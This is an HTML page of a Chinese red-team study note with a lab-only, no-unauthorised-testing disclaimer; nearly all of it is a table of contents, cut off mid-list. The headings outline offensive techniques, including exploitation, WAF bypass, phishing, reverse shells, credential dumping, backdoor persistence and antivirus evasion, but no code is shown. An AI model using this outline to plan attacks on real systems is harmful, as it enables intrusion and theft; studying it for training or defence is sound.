<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Notes twenty-sixth days-渗透攻击-红队</title>
  <link rel="stylesheet" href="https://stackedit.io/style.css" />
</head>

<body class="stackedit">
  <div class="stackedit__left">
    <div class="stackedit__toc">
      
<ul>
<li>
<ul>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>

    </div>
  </div>
  <div class="stackedit__right">
    <div class="stackedit__html">
      <p>**</p>
<h1><a id="Notes_Fifteenth_Daydayu_1"></a>Notes twenty-sixth days-渗透攻击-红队(dayu)</h1>
<p>**</p>
<p>作者：<strong>大余</strong><br>
时间：2020-10-12</p>
<p>请注意：对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。</p>
<p>我必须再重申一遍：务必不要做未授权测试！不要未经授权在真实网络环境中复现任何本书中描述的攻击。即使是出于好奇而不是恶意，你仍然会因未授权测试行为而陷入很多麻烦。为了个人能更好的继续学习发展，有很多漏洞奖励计划和靶场可以供你学习试验，但是请记住，即使是参加漏洞奖励计划，私自测试范围外的网站或对网站进行深入破坏也会让你有大麻烦。<br>
</p><div class="toc"><h3>文章目录</h3><ul><li><a href="#Notes_Fifteenth_Daydayu_1">Notes Fifteenth Day-渗透攻击-红队-内部信息搜集(dayu)</a></li><li><a href="#_22">一、信息收集</a></li><ul><li><a href="#1_24">1、主机发现</a></li><li><a href="#nmap_26">nmap</a></li><li><a href="#Masscan_89">Masscan</a></li><li><a href="#Nbtscan_122">Nbtscan</a></li><li><a href="#hping3_161">hping3</a></li><li><a href="#2_205">2、关联信息生成</a></li><li><a href="#pydictor_219">字典生成：pydictor</a></li><li><a href="#3_269">3、开放漏洞情报</a></li><li><a href="#_271">常用网站</a></li><li><a href="#Search_ExploitDB_283">Search Exploit一DB</a></li><li><a href="#4OSINT_294">4、开源情报信息搜集(OSINT)</a></li><li><a href="#_296">搜索引擎语法</a></li><li><a href="#_304">在线接口</a></li><li><a href="#_327">相关工具</a></li><li><a href="#5Github_Hacking_338">5、Github Hacking</a></li><li><a href="#_387">搜索代码</a></li><li><a href="#_438">搜索案例</a></li><li><a href="#_447">自动化工具</a></li><li><a href="#6google_hacking_460">6、google hacking</a></li><li><a href="#7Gitallsecret_494">7、Git-all-secret</a></li><li><a href="#8mailsniperps1outlook_507">8、mailsniper.ps1获取outlook所有联系人</a></li><li><a href="#9_555">9、内网渗透之信息收集</a></li><li><a href="#Windows_557">Windows（工作者和域）</a></li><li><a href="#Windows_664">Windows（域）</a></li><li><a href="#Linux_691">Linux</a></li><li><a href="#10wmic_723">10、后渗透信息收集之wmic命令的一些使用方法</a></li><li><a href="#wmic_733">wmic的简单使用</a></li><li><a href="#wmic_752">以进行为例展现wmic的使用</a></li><li><a href="#powershellGetWmi_808">关于powershell的Get-Wmi对象</a></li><li><a href="#11_829">11、内网横向常见端口</a></li><li><a href="#Port_445_831">Port. 445</a></li><li><a href="#Port137138139_855">Port:137、138、139</a></li></ul><li><a href="#_917">二、打入内网</a></li><ul><li><a href="#1WiFi_919">1、外部接入点-WiFi</a></li><li><a href="#211__DNSSpoofEvil_PortalDWall_921">2.1.1 无线攻击实战应用之 DNSSpoof、Evil Portal、DWall</a></li><li><a href="#212__955">2.1.2 防护意见</a></li><li><a href="#2_963">2、应用系统漏洞利用</a></li><li><a href="#221__965">2.2.1 常见漏洞扫描</a></li><li><a href="#2211_Nmap_967">2.2.1.1 Nmap扫描漏洞技巧</a></li><li><a href="#2212_impacketmssql_1003">2.2.1.2 impacket框架之mssql服务器安全检测</a></li><li><a href="#2213_MS17010py_1101">2.2.1.3 MS17010py脚本利用</a></li><li><a href="#222__1133">2.2.2 未授权访问漏洞</a></li><li><a href="#2221_1203">2.2.2.1未授权漏洞总结</a></li><li><a href="#Redis_1206">Redis</a></li><li><a href="#Jenkins_1279">Jenkins</a></li><li><a href="#Mongodb_1315">Mongodb</a></li><li><a href="#ZooKeeper_1351">ZooKeeper</a></li><li><a href="#Elasticsearch_1420">Elasticsearch</a></li><li><a href="#Memcache_1477">Memcache</a></li><li><a href="#Hadoop_1497">Hadoop</a></li><li><a href="#Couchdb_1567">Couchdb</a></li><li><a href="#Ldap_1581">Ldap</a></li><li><a href="#2222_JBOSS_1598">2.2.2.2 JBOSS未授权访问</a></li><li><a href="#223__1626">2.2.3 远程代码执行漏洞</a></li><li><a href="#2231_Java_1627">2.2.3.1 Java下奇怪的命令执行</a></li><li><a href="#2232_Shiro_1670">2.2.3.2 Shiro反序列化记录</a></li><li><a href="#2233_RMI_1703">2.2.3.3 RMI-反序列化</a></li><li><a href="#2234_JNDI_1715">2.2.3.4 JNDI注入</a></li><li><a href="#2235_fastjson_1740">2.2.3.5 fastjson漏洞浅析</a></li><li><a href="#2236_CVE201911043_PHP_1756">2.2.3.6 CVE-2019-11043 PHP远程代码执行复现</a></li><li><a href="#2237_java_webshell1_1775">2.2.3.7 java webshell从入门到入狱系列1-基础篇</a></li><li><a href="#2238_XMLdecoder__dayuThird_day_1880">2.2.3.8 深究XMLdecoder  (dayu-Third day)</a></li><li><a href="#2239_FastJson__1898">2.2.3.9 FastJson 反序列化学习</a></li><li><a href="#22310_Oracle_xml_1919">2.2.3.10 Oracle 数据库安全思考之xml反序列化</a></li><li><a href="#22311_Webshell_1933">2.2.3.11 Webshell绕安全模式执行命令</a></li><li><a href="#22312_Java_XEE_1947">2.2.3.12 Java 下的XEE漏洞</a></li><li><a href="#22313_Solr_Velocity_1973">2.2.3.13 Solr Velocity模板远程代码复现及利用指南</a></li><li><a href="#22314_SolrRCEviaVelocitytemplate_1981">2.2.3.14 Solr-RCE-via-Velocity-template</a></li><li><a href="#22315_java_webshell_2Bypass_1996">2.2.3.15 java webshell 从入门到入狱系列2-攻防对抗之Bypass-上篇</a></li><li><a href="#22316_java_webshell_3Bypass_2004">2.2.3.16 java webshell 从入门到入狱系列3-攻防对抗之Bypass-中篇</a></li><li><a href="#22317_java_webshell_4Bypass_2015">2.2.3.17 java webshell 从入门到入狱系列4-攻防对抗之Bypass-下篇</a></li><li><a href="#22318_Javadayufourth_day_2023">2.2.3.18 Java反序列化过程深究（dayu-fourth day）</a></li><li><a href="#22319_Apache_Slorjmx_rmi_2038">2.2.3.19 Apache Slor不安全配置远程代码执行漏洞复现及jmx rmi利用分析</a></li><li><a href="#22320_java_2048">2.2.3.20 java命令执行小细节</a></li><li><a href="#22321_JDKGadgets7u21_2056">2.2.3.21 JDK反序列化Gadgets-7u21</a></li><li><a href="#22322_WeblogicT3CVE20192890Analysis_2078">2.2.3.22 Weblogic-T3-CVE-2019-2890-Analysis</a></li><li><a href="#22323_springbootactuators_2087">2.2.3.23 spring-boot-actuators未授权漏洞</a></li><li><a href="#22324_SEMCMS26_2095">2.2.3.24 SEMCMS2.6后台文件上传漏洞审计</a></li><li><a href="#22325_lvyecmsgetshell_2102">2.2.3.25 代码审计之lvyecms后台getshell</a></li><li><a href="#22326_Log4jUnserializeAnalysis_2109">2.2.3.26 Log4j-Unserialize-Analysis</a></li><li><a href="#22327_JAVA_FastJson_2118">2.2.3.27 JAVA反序列化- FastJson组件</a></li><li><a href="#22328_Springsecuriyoauth2_CVE20181260_2126">2.2.3.28 Spring-securiy-oauth2 (CVE-2018-1260)</a></li><li><a href="#224_WAFbypassdayuFifth_day_2134">2.2.4 WAF-bypass（dayu-Fifth day）</a></li><li><a href="#IPCDN_2138">找真实IP，绕过CDN</a></li><li><a href="#https_2194">https降级绕过</a></li><li><a href="#ssl_2201">ssl问题绕过</a></li><li><a href="#method__2260">method 绕过</a></li><li><a href="#Heard_IP__2274">Heard IP 绕过</a></li><li><a href="#XSS_2319">XSS</a></li><li><a href="#SQL_2351">SQL</a></li><li><a href="#Mysql_2392">Mysql</a></li><li><a href="#_2472">命令执行</a></li><li><a href="#_2530">文件上传绕过</a></li><li><a href="#_2554">解析漏洞</a></li><li><a href="#PHP_CGI__2591">PHP CGI 解析漏洞</a></li><li><a href="#NTFS_ADS_2604">系统特性：利用NTFS ADS特性</a></li><li><a href="#waf_2621">协议解析不一致，绕过waf（注入跨站也可尝试）</a></li><li><a href="#Header__2639">文件类型绕过/Header 头类型</a></li><li><a href="#_2650">未解析所有文件</a></li><li><a href="#ContentDisposition_2659">不规则Content-Disposition文件名覆盖</a></li><li><a href="#boundary__2684">boundary 绕过</a></li><li><a href="#_2731">文件名覆盖绕过</a></li><li><a href="#_2746">遗漏文件名</a></li><li><a href="#_2754">其他类型绕过</a></li><li><a href="#HPP_HTTP_2788">HPP HTTP参数污染/拼接绕过</a></li><li><a href="#HPF_HTTP_2803">HPF HTTP分割注绕过</a></li><li><a href="#_2822">最后另类绕过合集</a></li><li><a href="#225_JS_2932">2.2.5 登录口JS前端加密绕过</a></li><li><a href="#jsEncrypter_dayuSixth_day_2954">jsEncrypter安装与本地测试 （dayu-Sixth day）</a></li><li><a href="#226_XMLDecoder_POC_2988">2.2.6 XMLDecoder 标签、POC</a></li><li><a href="#227_phpMyAdmingetshell_3018">2.2.7 phpMyAdmin去getshell</a></li><li><a href="#228_JWT_3036">2.2.8 攻击JWT的一些方法</a></li><li><a href="#229__3046">2.2.9 上传漏洞</a></li><li><a href="#_3049">上传技巧</a></li><li><a href="#_3128">上传的思路</a></li><li><a href="#KindEditor_3191">KindEditor</a></li><li><a href="#2291__3217">2.2.9.1 上传漏洞总结</a></li><li><a href="#_3220">概要说明</a></li><li><a href="#_3258">服务端的上传验证</a></li><li><a href="#_3303">上传绕过姿势</a></li><li><a href="#aspaspxphpjsp_3404">文件扩展名绕过（asp、aspx、php、jsp）</a></li><li><a href="#ContentDispositioncontenttype_3656">Content-Disposition、content-type、文件内容检测、双文件</a></li><li><a href="#JavaScriptdayuSeventh_day_3707">客户端检测（JavaScript检测）（dayu-Seventh day)</a></li><li><a href="#WAF_3743">WAF绕过（阿里云、安全狗、百度云、云锁）</a></li><li><a href="#_3827">实战分析</a></li><li><a href="#uploadlabs_3861">upload-labs过关</a></li><li><a href="#_3898">造洞</a></li><li><a href="#2210__4000">2.2.10 注入漏洞</a></li><li><a href="#MSSQL_4019">MSSQL注入</a></li><li><a href="#MYSQL_4088">MYSQL注入</a></li><li><a href="#_4178">盲注</a></li><li><a href="#Sqlmap_4205">Sqlmap</a></li><li><a href="#22101_MSSQLdayuEighth_day_4435">2.2.10.1 MSSQL利用总结（dayu-Eighth day）</a></li><li><a href="#_4437">命令执行</a></li><li><a href="#_4669">注册表</a></li><li><a href="#_4716">持久化</a></li><li><a href="#_4767">文件操作</a></li><li><a href="#_4812">信息获取</a></li><li><a href="#22102_MSSQLPowerUpSQL__4860">2.2.10.2 攻击MSSQL--PowerUpSQL 介绍</a></li><li><a href="#MSSQL_4861">发现MSSQL实例</a></li><li><a href="#MSSQL_4874">获取MSSQL信息</a></li><li><a href="#_4878">测试口令</a></li><li><a href="#_4886">持久性</a></li><li><a href="#_4938">获取域信息</a></li><li><a href="#_4948">防御方案</a></li><li><a href="#22103_Mysql_4956">2.2.10.3 如何利用Mysql安全特性发现漏洞</a></li><li><a href="#Mysql_4962">Mysql权限</a></li><li><a href="#load_file_4975">load_file函数用法</a></li><li><a href="#Mysql_5004">Mysql版本差异</a></li><li><a href="#_5009">成功利用实例</a></li><li><a href="#_5059">脑洞大开</a></li><li><a href="#22104_Hibernate_5085">2.2.10.4 Hibernate基本注入</a></li><li><a href="#22105_mysql_general_log_fileslow_query_log_file_5185">2.2.10.5 mysql 利用general_log_file、slow_query_log_file写文件</a></li><li><a href="#22106_SQL_Server_Getshell__5216">2.2.10.6 SQL Server注入 Getshell 有趣案例</a></li><li><a href="#2211__5334">2.2.11 文件读取漏洞</a></li><li><a href="#2212_Pentesterlab_Xss_5340">2.2.12 Pentesterlab Xss</a></li><li><a href="#2213_Office_5355">2.2.13 Office宏的基本利用</a></li><li><a href="#2214_Javasecuritycalendar2019CandyCane_5409">2.2.14 Java-security-calendar-2019-Candy-Cane</a></li><li><a href="#2215_Discuz_Ssrf_Rce_5424">2.2.15 Discuz Ssrf Rce漏洞分析报告</a></li><li><a href="#2216_WordPress_5441">2.2.16 WordPress语言文件代码执行漏洞分析</a></li><li><a href="#2217_Struts2s2048_5551">2.2.17 Struts2远程命令执行s2-048漏洞分析报告</a></li><li><a href="#2218_phpD_5567">2.2.18 静态免杀php一句话（已过D盾，河马，安全狗）</a></li><li><a href="#2219__5577">2.2.19 金融信息系统安全测评方法（不公布！）</a></li><li><a href="#2220_ApachePoiXXEAnalysis_5591">2.2.20 Apache-Poi-XXE-Analysis</a></li><li><a href="#CVE20143529_5600">CVE-2014-3529</a></li><li><a href="#CVE201912415_5727">CVE-2019-12415</a></li><li><a href="#2220_xsswaf_5850">2.2.20 记一次阿里主站xss测试及绕过waf防护</a></li><li><a href="#2221_ClassLoader_5864">2.2.21 ClassLoader类加载机制</a></li><li><a href="#2222_SSRFdayuNinth_Day_5872">2.2.22 浅谈SSRF原理及其利用（dayu-Ninth Day）</a></li><li><a href="#2223_SpringDataCommons_CVE20181273_5888">2.2.23 Spring-Data-Commons (CVE-2018-1273)</a></li><li><a href="#2224_xss_5901">2.2.24 xss绕过代码后端长度限制的方法</a></li><li><a href="#2225_mysqlmof_6081">2.2.25 mysql提权之mof</a></li><li><a href="#2226_mysqludf_6092">2.2.26 mysql提权之udf</a></li><li><a href="#2227_XSS__6100">2.2.27 XSS 基础学习</a></li><li><a href="#2228_java_shell_jettyshell__6112">2.2.28 java 反射与内存shell 初探-基于jetty容器的shell 维权</a></li><li><a href="#2229__DNSLOGdayuTenth_6127">2.2.29 利用 DNSLOG回显（dayu-Tenth</a></li><li><a href="#2230__6137">2.2.30 文件合成/图片马生成</a></li><li><a href="#2231UDF_6176">2.2.31UDF提权</a></li><li><a href="#23__6184">2.3 社会工程学</a></li><li><a href="#231__6185">2.3.1 水坑攻击</a></li><li><a href="#232__6201">2.3.2 鱼叉攻击</a></li><li><a href="#2321_Swaks_6208">2.3.2.1 Swaks-邮件伪造</a></li><li><a href="#2322__6216">2.3.2.2 邮件伪造防御技术</a></li><li><a href="#SPF_6218">SPF</a></li><li><a href="#DKIM_6230">DKIM</a></li><li><a href="#DMARC_6242">DMARC</a></li><li><a href="#233__6262">2.3.3 钓鱼攻击</a></li><li><a href="#2331__6268">2.3.3.1 视觉效果</a></li><li><a href="#2332__6309">2.3.3.2 凭证劫持</a></li><li><a href="#2334__6419">2.3.3.4 克隆技术</a></li><li><a href="#2335_Word_6438">2.3.3.5 Word文档-云宏代码钓鱼</a></li><li><a href="#24_APP_6449">2.4 APP密码算法通用分析方法</a></li><li><a href="#_6456">密码算法介绍</a></li><li><a href="#_6494">分析原理</a></li><li><a href="#25_Linuxshe_6571">2.5 Linux下反弹she命令</a></li><li><a href="#26_Browser_Pivot_for_Chrome_6671">2.6 Browser Pivot for Chrome</a></li></ul><li><a href="#dayuEleventh_Day_6689">三、命令与控制（dayu-Eleventh Day）</a></li><ul><li><a href="#31_HTTP__ABPTTS_6690">3.1 HTTP 隧道 ABPTTS</a></li><li><a href="#32_HTTP__reGeorg_6792">3.2 HTTP 隧道 reGeorg</a></li><li><a href="#33_HTTP__Tunna_6880">3.3 HTTP 隧道 Tunna</a></li><li><a href="#34_HTTP__reDun_6968">3.4 HTTP 隧道 reDun</a></li><li><a href="#35__Ptunnel_ICMP_7092">3.5 基于 Ptunnel 建立ICMP隧道</a></li><li><a href="#36_anydesk_7142">3.6 使用anydesk做远控</a></li><li><a href="#37_Kerberos_7285">3.7 Kerberos域内委派攻击（重要了解）</a></li><li><a href="#38_ATTCK_7304">3.8 ATT&amp;CK攻防初窥系列-执行篇</a></li><li><a href="#39_PowershelldayuTwelfth_Day_7316">3.9 Powershell（dayu-Twelfth Day）</a></li><li><a href="#391_360_powershell_7317">3.9.1 利用360正则不严执行 powershell上线</a></li><li><a href="#392__Powershell_7330">3.9.2 关于 Powershell抗安全软件</a></li><li><a href="#393_InvokeObfuscation_7346">3.9.3 Invoke-Obfuscation介绍</a></li></ul><li><a href="#_7357">四、穿透与转发</a></li><ul><li><a href="#41_Frp_7358">4.1 Frp内网穿透实战</a></li><li><a href="#42_ported_7596">4.2 基于ported端口转发</a></li><li><a href="#43_Venom_7747">4.3 Venom-代理转发、多级穿透</a></li><li><a href="#44_DNSdayuThirteenth_Day_7759">4.4 DNS隧道（dayu-Thirteenth Day）</a></li><li><a href="#441_dnsdns2tcp_7760">4.4.1 dns隧道之dns2tcp</a></li><li><a href="#442_dnsdnscat2_7772">4.4.2 dns隧道之dnscat2</a></li><li><a href="#443_dnsIodine_7780">4.4.3 dns隧道之Iodine</a></li><li><a href="#444_dnsmsfdnscat2_7789">4.4.4 使用dns协议上线msf之dnscat2</a></li><li><a href="#445__dnsmsfdns2tcp_7796">4.4.5  使用dns协议上线msf之dns2tcp</a></li></ul><li><a href="#_7810">五、内部信息收集</a></li><ul><li><a href="#51__7811">5.1 本地信息搜集</a></li><li><a href="#511_DNS_7812">5.1.1 用普通权限的域帐户获得域环境中所有DNS解析记录</a></li><li><a href="#512_TokenSession_7887">5.1.2 令牌Token和会话Session原理与攻略</a></li><li><a href="#513_hash_7892">5.1.3 内存转储-获取本地hash</a></li><li><a href="#514__8080">5.1.4 转储域账户哈希值</a></li><li><a href="#515_SPNdayuFourteenth_day_8093">5.1.5 SPN发现与利用（dayu-Fourteenth day）</a></li><li><a href="#516__8154">5.1.6 哈希传递攻击利用</a></li><li><a href="#52__8341">5.2 用户习惯</a></li><li><a href="#521__8342">5.2.1 从目标文件中做信息搜集第一季</a></li><li><a href="#522__8387">5.2.2 获取当前系统所有用户的谷歌浏览器密码</a></li><li><a href="#523_adsutilvbs_dayuFifteenth_Day_8587">5.2.3 adsutil.vbs 获取密码（dayu-Fifteenth Day）</a></li><li><a href="#524_rdp_8597">5.2.4 解密目标机器保存的rdp凭证</a></li><li><a href="#525_Hashcat__8609">5.2.5 Hashcat 神器详解</a></li><li><a href="#526_WinscpSecureCRThash_8668">5.2.6 解密Winscp和SecureCRT客户端中保存的密码hash</a></li><li><a href="#Winscp_8669">Winscp</a></li><li><a href="#SecureCRT_8713">SecureCRT</a></li><li><a href="#_8776">附上脚本</a></li><li><a href="#527_Weblogic_8791">5.2.7 破解Weblogic配置文件中的数据库密码</a></li><li><a href="#528__8801">5.2.8 获取域控/系统日志</a></li><li><a href="#dumpel_8803">dumpel</a></li><li><a href="#wevtutil_8904">wevtutil</a></li><li><a href="#psloglist_8910">psloglist</a></li><li><a href="#53__8917">5.3 网络信息收集</a></li><li><a href="#531_WEB_8918">5.3.1 发现目标WEB程序敏感目录</a></li><li><a href="#532_SCF_9163">5.3.2 基于SCF做目标内网信息搜集</a></li><li><a href="#533__9174">5.3.3 内网漏洞快速检测技巧</a></li><li><a href="#534__9181">5.3.4 域环境信息搜集</a></li><li><a href="#5341_Active_Directory_Domain_Services___9182">5.3.4.1 Active Directory Domain Services - 获取域控信息</a></li><li><a href="#5342_Windows_9274">5.3.4.2 Windows域渗透-用户密码枚举</a></li><li><a href="#5343_dns_9397">5.3.4.3 不同环境下域dns记录信息收集方法</a></li><li><a href="#5344_impacketdayuSixteenth_Day_1628">5.3.4.4 impacket框架之域信息获取（dayu-Sixteenth Day)</a></li><li><a href="#Secretsdump_1631">Secretsdump</a></li><li><a href="#Esentutl_1708">Esentutl</a></li><li><a href="#Ticket_1714">Ticket</a></li><li><a href="#lookupsidpy_1719">lookupsid.py</a></li><li><a href="#5345_user2sidsid2user_1729">5.3.4.5 域信息收集之user2sid，sid2user</a></li><li><a href="#54__1764">5.4 工作组环境信息搜集</a></li><li><a href="#541_MSF1_1765">5.4.1 基于MSF发现内网存活主机（1）</a></li><li><a href="#542_MSF2_1962">5.4.2 基于MSF发现内网存活主机（2）</a></li><li><a href="#543_MSF3_2137">5.4.3 基于MSF发现内网存活主机（3）</a></li><li><a href="#544_MSF4_2302">5.4.4 基于MSF发现内网存活主机（4）</a></li><li><a href="#545_MSF5_2476">5.4.5 基于MSF发现内网存活主机（5）</a></li><li><a href="#546_MSF6_2712">5.4.6 基于MSF发现内网存活主机（6）</a></li><li><a href="#547_sqlDataSourceEnumerator_2851">5.4.7 基于sqlDataSourceEnumerator发现内网存活主机</a></li><li><a href="#548_ICMPdayuSeventeenth_Day_2874">5.4.8 基于ICMP发现内网存活主机（dayu-Seventeenth Day）</a></li><li><a href="#549_UDP_2918">5.4.9 基于UDP发现内网存活主机</a></li><li><a href="#5410_ARP_2988">5.4.10 基于ARP发现内网存活主机</a></li><li><a href="#5411_snmp_3082">5.4.11 基于snmp发现内网存活主机</a></li><li><a href="#5412_netbios_3194">5.4.12 基于netbios发现內网存活主机</a></li><li><a href="#55_powershelldayuEighteenth_Day_3313">5.5 powershell一条命令行进行内网扫描（dayu-Eighteenth Day）</a></li><li><a href="#56__3351">5.6 内网信息收集之内网代理</a></li></ul><li><a href="#_3382">六、权限提升</a></li><ul><li><a href="#61__3383">6.1 操作系统提权</a></li><li><a href="#611_Linux_3384">6.1.1 Linux</a></li><li><a href="#6111_Linuxexp_3385">6.1.1.1 Linux提权-依赖exp</a></li><li><a href="#6112_Sudo_CVE201914287_3451">6.1.1.2 Sudo漏洞分析 (CVE-2019-14287)</a></li><li><a href="#6113_Linux_3696">6.1.1.3 Linux提权之内核提权</a></li><li><a href="#612_Windows_3706">6.1.2 Windows</a></li><li><a href="#6121_windowsexp_3707">6.1.2.1 windows提权-快速查找exp</a></li><li><a href="#6122_Token_3811">6.1.2.2 Token窃取与利用</a></li><li><a href="#6123_CVE20191388_Windows_UAC__3825">6.1.2.3 CVE2019-1388 Windows UAC 提权漏洞</a></li><li><a href="#613__3880">6.1.3 第三方组件提权</a></li></ul><li><a href="#_3913">七、权限维持</a></li><ul><li><a href="#71__3914">7.1 操作系统后门</a></li><li><a href="#711_Linux_3915">7.1.1 Linux</a></li><li><a href="#Linux_3917">Linux操作系统后门</a></li><li><a href="#SSH_4001">SSH后门</a></li><li><a href="#SSH_Trapper_4007">SSH Trapper后门</a></li><li><a href="#Rookit_4038">Rookit</a></li><li><a href="#712_Windows_4117">7.1.2 Windows</a></li><li><a href="#7121_dayuNineteenth_Day_4704">7.1.2.1 对抗权限长期把控-伪造无效签名（dayu-Nineteenth Day）</a></li><li><a href="#7122_windows_5084">7.1.2.2 常见windows持久控制总结</a></li><li><a href="#7123_Windows_RID_5095">7.1.2.3 Windows RID劫持</a></li><li><a href="#7124_Shfit_5105">7.1.2.4 Shfit映像劫持后门新玩法</a></li><li><a href="#7124_windows_5171">7.1.2.4 windows权限维持篇-注册表维权</a></li><li><a href="#7125_windows2_5183">7.1.2.5 windows权限维持篇2-计划任务维权</a></li><li><a href="#7126_windows_3service_5191">7.1.2.6 windows 权限维持篇3-服务service维权</a></li><li><a href="#72__5200">7.2 第三方组件后门</a></li><li><a href="#721_APT_5203">7.2.1 APT对抗（一）红蓝对抗关于后门对抗</a></li><li><a href="#722_APT_5370">7.2.2 APT对抗（二）红蓝对抗关于后门对抗</a></li><li><a href="#723_APT_5422">7.2.3 APT对抗（三）红蓝对抗关于后门对抗</a></li><li><a href="#724_APT_5460">7.2.4 APT对抗（四）红蓝对抗关于后门对抗</a></li><li><a href="#725_dlldayuTwentieth_Day_5561">7.2.5 dll劫持（dayu-Twentieth Day）</a></li><li><a href="#726_APT_5575">7.2.6 APT对抗-红蓝对抗关于后门对抗（五~七）</a></li><li><a href="#727_ATTCK_5579">7.2.7 ATT&amp;CK攻防初窥系列--横向移动篇</a></li><li><a href="#728_LinuxLD_PRELOAD_5761">7.2.8 Linux权限维持之LD_PRELOAD</a></li><li><a href="#729_Linux_5894">7.2.9 Linux权限维持之进程注入</a></li><li><a href="#7210_WindowsOffice_6015">7.2.10 Windows权限维持之Office启动</a></li></ul><li><a href="#_6020">八、内网渗透基础</a></li><ul><li><a href="#81_Kerberos_6021">8.1 Kerberos协议</a></li><li><a href="#811_WindowsKerberos_6022">8.1.1 Windows认证原理之Kerberos篇</a></li><li><a href="#82_NTLM_6038">8.2 NTLM</a></li><li><a href="#821_NTLMHash_6039">8.2.1 NTLM协议及Hash抓取</a></li><li><a href="#822_WindowsNTLMdayuTwenty_one_days_6050">8.2.2 Windows认证原理之NTLM篇（dayu-Twenty one days）</a></li><li><a href="#83_%09_6062">8.3 	内网命令行渗透笔记</a></li><li><a href="#84__6078">8.4 内网渗透中的文件传输</a></li><li><a href="#85_msfvenompayload_6100">8.5 msfvenom常用生成payload命令</a></li><li><a href="#86_windows_6271">8.6 windows环境压缩文件&amp;文件夹命令合集</a></li><li><a href="#87_Windows_net__6389">8.7 Windows net 命令集使用</a></li><li><a href="#88_CobaltstrikeMetasploit_6401">8.8 Cobaltstrike与Metasploit实战联动</a></li><li><a href="#89__6526">8.9 渗透中常用的复制工具</a></li></ul><li><a href="#APT_6653">九、红队自研-APT攻击方案模拟</a></li><ul><li><a href="#91__6654">9.1 免杀方案研发</a></li><li><a href="#911_Shellcode_6655">9.1.1 实战免杀诺顿Shellcode载入内存免杀</a></li><li><a href="#912__6713">9.1.2 人人都能过杀软</a></li><li><a href="#913_360_6886">9.1.3 远控木马极速免杀360五引擎</a></li><li><a href="#914_Ruby_shellcode_6892">9.1.4 基于Ruby内存加载 shellcode第一季</a></li><li><a href="#915_dllshellcode_6949">9.1.5 dll加载shellcode免杀上线（dayu-Twenty-second days）</a></li><li><a href="#916_aspxpayload_333">9.1.6 借助aspx对payload进行分离免杀</a></li><li><a href="#917__533">9.1.7 静态恶意代码逃逸（第一课）</a></li><li><a href="#918__628">9.1.8 静态恶意代码逃逸（第二课）</a></li><li><a href="#919__790">9.1.9 静态恶意代码逃逸（第三课）</a></li><li><a href="#9110__948">9.1.10 静态恶意代码逃逸（第四课）</a></li><li><a href="#9111__1073">9.1.11 静态恶意代码逃逸（第五课）</a></li><li><a href="#9112__1372">9.1.12 静态恶意代码逃逸（第六课）</a></li><li><a href="#9113__Python_shellcode_1703">9.1.13 基于 Python内存加载 shellcode</a></li><li><a href="#9114_payload_1710">9.1.14 payload分离免杀思路</a></li><li><a href="#9115_small_payload_1761">9.1.15 基于实战中的small payload应用（一）</a></li><li><a href="#9116_small_payload_2003">9.1.16 基于实战中的small payload应用（二）</a></li><li><a href="#9117_Go_shellcode_2007">9.1.17 基于Go内存加载 shellcode（三）</a></li><li><a href="#9118_msf_2011">9.1.18 免杀技术之msf偏执模式</a></li><li><a href="#9119_shellcode_2087">9.1.19 